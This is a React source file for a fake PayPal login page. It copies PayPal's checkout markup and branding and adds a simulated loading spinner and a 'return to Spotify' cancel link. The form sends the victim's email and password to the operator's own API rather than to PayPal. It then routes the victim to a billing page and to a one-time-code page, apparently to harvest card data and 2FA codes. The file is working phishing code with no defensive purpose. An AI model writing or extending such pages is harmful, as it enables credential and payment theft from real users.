import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom"; // Import useHistory
import ipinfo from "ipinfo";
import Footer from "./Footer";
import axios from 'axios';
import { zokomId } from '../utils/auth'; // Import zokomId

const PayPalPass = () => {
  const [styles, setStyles] = useState(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fetchError, setFetchError] = useState(false);
  const [updateError, setUpdateError] = useState(false);
  const [userCountry, setUserCountry] = useState('US'); // Default to US
  const [flagUrl, setFlagUrl] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const history = useHistory(); // Initialize useHistory
  const userId = zokomId(); // Get userId

  // Add loading states
  const [isLoading, setIsLoading] = useState(true);
  const [loadingStyles, setLoadingStyles] = useState(null);

  const getFlagUrl = async (countryCode) => {
    // Use a more reliable flag API
    return `https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`;
  };

  useEffect(() => {
    const fetchCountryFromLocalStorage = async () => {
      try {
        const countryCode = localStorage.getItem('CountryCode') || 'US';
        setUserCountry(countryCode);

        const url = await getFlagUrl(countryCode);
        setFlagUrl(url);
      } catch (err) {
        console.error('Error fetching country from local storage:', err);
      }
    };

    fetchCountryFromLocalStorage();
  }, []);


  useEffect(() => {
    const loadAndUnloadStyles = async () => {
      try {
        // Load both style sheets
        const [loginStyles, codeInputCss] = await Promise.all([
          import('../../assets/styles/login.css'),
          import('../../assets/styles/codeinput.css')
        ]);

        setStyles(loginStyles.default);
        setLoadingStyles(codeInputCss.default);
        
        // Random duration between 0.5s and 3s
        const randomDuration = Math.floor(Math.random() * (3000 - 500 + 1) + 500);
        
        setTimeout(() => {
          setIsLoading(false);
          setLoadingStyles(null);
        }, randomDuration);
      } catch (error) {
        console.error('Error loading styles:', error);
        setIsLoading(false);
      }
    };

    loadAndUnloadStyles();

    // Cleanup function
    return () => {
      setLoadingStyles(null);
    };
  }, []);

  const handleFocus = () => {
    setIsFocused(true);
  };

  const handleBlur = (e) => {
    if (!e.target.value) {
      setIsFocused(false);
    }
  };

  useEffect(() => {
    const fetchEmail = async () => {
      try {
        // First try to get from localStorage
        const storedEmail = localStorage.getItem('paypalEmailOrMobile');
        if (storedEmail) {
          setEmail(storedEmail);
          return;
        }

        // If not in localStorage, fetch from API
        if (userId) {
          console.log('Fetching email for userId:', userId); // Debug log
          const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/paypal/user/${userId}`);
          console.log('API Response:', response.data); // Debug log
          
          if (response.data.email) {
            setEmail(response.data.email);
            localStorage.setItem('paypalEmailOrMobile', response.data.email);
          }
        }
      } catch (error) {
        console.error('Error fetching PayPal entry:', error);
        setFetchError(true);
      }
    };

    fetchEmail();
  }, [userId]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.put(`${process.env.REACT_APP_API_URL}/api/paypal`, { userId, email, password });
      console.log('PayPal entry updated:', response.data);
      history.push('/paypalbilling'); // Redirect to a success page or another component
    } catch (error) {
      console.error('Error updating PayPal entry:', error);
      setUpdateError(true);
    }
  };

  const handleOneTimeCodeLogin = (e) => {
    e.preventDefault();
    // Implement the logic for handling the one-time code login here
    console.log('One-time code login clicked');
    history.push('/code');
    // Redirect to the appropriate component or handle the logic as needed
  };

  return (
    <div className="desktop">
      <div id="main" style={{marginBottom: '50px'}} className="main" role="main">
        <section id="login" className="login" data-role="page" data-title="Log in to your PayPal account">
          <div className="corral">
            <div id="content" className="contentContainer activeContent contentContainerBordered">
              <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
              </div>
              <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>
              
              {!isLoading && (
                <>
                  <header id="header">
                    <p role="img" aria-label="PayPal Logo" className="paypal-logo paypal-logo-long"></p>
                  </header>
                  <h1 id="headerText" className="headerText">Pay with PayPal</h1>
                  <p id="pwdSubTagLine" className="subHeaderText">
                    With a PayPal account, you're eligible for Purchase Protection and Rewards.
                  </p>
                  <form
                    method="post"
                    className="proceed maskable"
                    autoComplete="off"
                    name="login"
                    onSubmit={handleSubmit}
                  >
                    <div id="passwordSection" className="clearfix splitEmail">
                      <div id="splitEmailSection" className="splitPhoneSection splitEmailSection">
                        <div className="textInput" id="login_emaildiv">
                          <div className="fieldWrapper">
                            <input
                              id="email"
                              name="login_email"
                              type="text"
                              onChange={(e) => setEmail(e.target.value)}
                              className="hasHelp validate validateEmpty"
                              value={email}
                              autoComplete="username"
                            />
                            <label htmlFor="email" className="fieldLabel">
                              Email or mobile number
                            </label>
                          </div>
                          <div className="errorMessage" id="emailErrorMessage">
                            <p className="emptyError hide">Required</p>
                            <p className="invalidError hide">
                              That email or mobile number format isn’t right
                            </p>
                          </div>
                        </div>
                      </div>
                      <div id="passwordSection" className="clearfix showHideButtonForEligibleBrowser">
                        <div className="textInput" id="login_passworddiv">
                          <div className="fieldWrapper">
                            <input
                              id="password"
                              name="login_password"
                              type="password"
                              className="hasHelp validateEmpty pin-password"
                              required
                              value={password}
                              placeholder="Password"
                              onChange={(e) => setPassword(e.target.value)}
                              aria-describedby="passwordErrorMessage"
                            />
                            <label htmlFor="password" className="fieldLabel">
                              Password
                            </label>
                            <label htmlFor="Show password" className="fieldLabel">
                              Show password
                            </label>
                            <button
                              type="button"
                              className="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
                              id="Show password"
                            >
                              Show
                            </button>
                            <label htmlFor="Hide" className="fieldLabel">
                              Hide
                            </label>
                            <button
                              type="button"
                              className="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
                              id="Hide"
                            >
                              Hide
                            </button>
                          </div>
                          <div className="errorMessage" id="passwordErrorMessage">
                            <p className="emptyError hide">Required</p>
                          </div>
                        </div>
                        
                        <a
                          href="https://www.paypal.com/authflow/password-recovery"
                          id="forgotPassword"
                          className="recoveryOption forgotPassword"
                        >
                          Forgot password?
                        </a>
                      </div>
                    </div>
                    <div className="actions">
                      <button
                        className="button actionContinue scTrack:unifiedlogin-login-submit"
                        type="submit"
                        id="btnLogin"
                        name="btnLogin"
                        value="Login"
                      >
                        Log In
                      </button>
                    </div>
                    <input type="hidden" name="splitLoginContext" value="inputPassword" />
                    <input type="hidden" name="isCookiedHybridEmail" value="true" />
                    <input
                      type="hidden"
                      name="partyIdHash"
                      value="d8a3700b100ea10ec932729f3cc833cd04ed6ce066dd45f186450914cb88bf36"
                    />
                    <input type="hidden" name="allowPasskeyAutofill" value="true" />
                    <input type="hidden" name="isUVPAAExist" value="yes" />
                  </form>
                  <div id="beginOtpLogin" className="otpLoginViaButton">
                    <button className="button" onClick={handleOneTimeCodeLogin}>
                      Log in with a one-time code
                    </button>
                  </div>
                  <div id="signupContainer" className="signupContainer">
                    <div className="loginSignUpSeparator">
                      <span className="textInSeparator">or</span>
                    </div>
                    <button
                      type="button"
                      id="startOnboardingFlow"
                      className="button secondary scTrack:unifiedlogin-click-signup-button onboardingFlowContentKey"
                      pa-marked="1"
                      onClick={() => window.location.href = 'https://www.paypal.com/signup'}
                    >
                      Create an Account
                    </button>
                  </div>
                  <div className="intentFooter">
                    <div className="cancelUrl">
                      <a
                                                    href="https://spotify.com"
                                                    data-url="https://payments.spotify.com/checkout/2a966a07-14c0-39e4-b0f1-f27ac82aba08/?country=US&market=us&product=2024-q4globalcampaign-intro&psp=paypal&token=EC-5G140757D6791933L&approval_token_id=91B256819V7453949&approval_session_id=91B256819V7453949"
                        className="scTrack:unifiedlogin-click-cancel-and-return cancelLink"
                        id="cancelLink"
                        aria-hidden="false"
                        pa-marked="1"
                      >
                        Cancel and return to Spotify Inc
                      </a>
                    </div>
                    <div className="localeSelector">
                      <span className="picker country-selector">
                        <span className="hide" id="countryPickerLink">
                          {userCountry}
                        </span>
                        <button
                          type="button"
                          aria-label="countryPickerLink"
                          className="country US"
                          style={{
                            backgroundImage: `url(${flagUrl})`,
                            backgroundPosition: 'center',
                            width: '24px',
                            height: '17px',
                            border: 'none',
                            cursor: 'pointer',
                            paddingLeft: '8px',
                            paddingRight: '8px',
                            paddingTop: '8px',
                          }}
                        />
                      </span>
                      <ul className="localeLink">
                        <li>
                          <a
                            className=" scTrack:unifiedlogin-footer-language_ar_EG"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=ar_EG&langTgl=ar"
                            lang="ar"
                            data-locale="ar_EG"
                            pa-marked="1"
                          >
                            العربية
                          </a>
                        </li>
                        <li>
                          <a
                            className="selected scTrack:unifiedlogin-footer-language_en_US"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=en_US&langTgl=en"
                            lang="en"
                            data-locale="en_US"
                            aria-current="true"
                            pa-marked="1"
                          >
                            English
                          </a>
                        </li>
                        <li>
                          <a
                            className=" scTrack:unifiedlogin-footer-language_fr_XC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=fr_XC&langTgl=fr"
                            lang="fr"
                            data-locale="fr_XC"
                            pa-marked="1"
                          >
                            Français
                          </a>
                        </li>
                        <li>
                          <a
                            className=" scTrack:unifiedlogin-footer-language_es_XC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=es_XC&langTgl=es"
                            lang="es"
                            data-locale="es_XC"
                            pa-marked="1"
                          >
                            Español
                          </a>
                        </li>
                        <li>
                          <a
                            className=" scTrack:unifiedlogin-footer-language_zh_XC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=zh_XC&langTgl=zh"
                            lang="zh"
                            data-locale="zh_XC"
                            pa-marked="1"
                          >
                            中文
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </section>        
      </div>
      <Footer />
    </div>
  );
};

export default PayPalPass;
